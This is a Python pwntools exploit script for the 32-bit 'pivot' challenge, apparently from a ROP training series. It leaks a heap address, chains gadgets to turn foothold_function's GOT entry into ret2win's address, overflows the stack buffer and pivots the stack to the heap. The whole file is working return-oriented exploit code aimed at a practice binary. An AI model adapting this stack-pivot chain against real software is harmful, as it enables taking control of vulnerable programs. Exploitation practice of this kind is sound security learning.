#!/usr/bin/python3

from pwn import *

PROG_NAME = "./pivot32"
LIB_PIVOT = "./libpivot32.so"
p = process(PROG_NAME)
elf = p.elf
lib = ELF(LIB_PIVOT)

if args.ATTACH:
    gdb.attach(p, '''break main''')

pop_eax_addr = 0x0804882c           # pop eax; ret;
xchg_eax_esp_addr = 0x0804882e      # xchg eax, esp; ret;
mov_eax_ptr_eax_addr = 0x08048830   # mov eax, dword ptr [eax]; ret;
pop_ebx_addr = 0x080484a9           # pop ebx; ret;
add_eax_ebx_addr = 0x08048833       # add eax, ebx; ret;
call_eax_addr = 0x080485f0          # call eax;

# leak heap address
p.recvuntil(b': ')
heap_pivot_addr = p.recvline().rstrip()
heap_pivot_addr = int(heap_pivot_addr, 16)

# need to call foothold_function once to populate its GOT
# entry correctly
main_payload = p32(elf.plt['foothold_function'])
main_payload += p32(pop_eax_addr)
main_payload += p32(elf.got['foothold_function'])
main_payload += p32(mov_eax_ptr_eax_addr)
main_payload += p32(pop_ebx_addr)
# add diff between ret2win and foothold_function offsets to
# the real address of foothold_function will get us the real
# address of ret2win
main_payload += p32(lib.symbols['ret2win'] - lib.symbols['foothold_function'])
main_payload += p32(add_eax_ebx_addr)
main_payload += p32(call_eax_addr)

p.recvuntil(b'> ')
p.sendline(main_payload)

smash_payload = b'A' * (0x28 + 0x4)
smash_payload += p32(pop_eax_addr)
smash_payload += p32(heap_pivot_addr)
# set stack pointer to our heap address
smash_payload += p32(xchg_eax_esp_addr)

p.recvuntil(b'> ')
p.sendline(smash_payload)

p.interactive()
